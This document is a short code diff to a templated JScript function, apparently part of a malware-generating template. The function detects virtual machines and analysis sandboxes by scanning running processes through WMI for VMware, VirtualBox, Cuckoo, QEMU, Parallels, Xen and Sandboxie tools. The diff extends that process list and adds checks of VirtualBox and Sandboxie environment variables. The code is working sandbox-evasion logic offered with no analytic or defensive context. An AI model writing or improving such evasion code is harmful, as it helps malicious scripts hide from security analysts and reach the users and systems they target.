@@ -32,7 +32,7 @@
     function {{ v.fn_sandbox }}() {
         try {
             var wmi  = GetObject("winmgmts:");
-            var bad  = ["vmtoolsd.exe","vboxservice.exe","cuckoo.exe","vmsrvc.exe","qemu-ga.exe"];
+            var bad  = ["vmtoolsd.exe","vboxservice.exe","cuckoo.exe","vmsrvc.exe","qemu-ga.exe","prl_tools.exe","xenservice.exe","sandboxiedcomlaunch.exe","vmusrvc.exe"];
             var pq   = wmi.ExecQuery("SELECT Name FROM Win32_Process");
             for (var e = new Enumerator(pq); !e.atEnd(); e.moveNext()) {
                 var n = e.item().Name.toLowerCase();
@@ -72,6 +72,11 @@
             var nac = 0;
             for (var ena = new Enumerator(naq); !ena.atEnd(); ena.moveNext()) nac++;
             if (nac < 2) return true;
+        } catch(e) {}
+        try {
+            var _env = new ActiveXObject("WScript.Shell").Environment("Process");
+            if (_env("VBOX_VERSION") !== "") return true;
+            if (_env("SANDBOXIE_HOME") !== "") return true;
         } catch(e) {}
         return false;
     }
